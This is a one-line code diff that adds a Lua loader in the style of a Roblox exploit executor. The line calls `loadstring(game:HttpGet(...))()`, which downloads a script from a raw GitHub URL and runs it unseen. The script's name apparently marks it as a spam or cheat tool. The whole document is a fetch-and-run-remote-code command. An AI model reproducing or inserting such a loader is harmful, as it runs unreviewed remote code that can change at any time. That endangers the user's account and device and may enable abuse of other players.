@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/beta-buddytime-spam4-iy5c998hfbn827.lua"))()
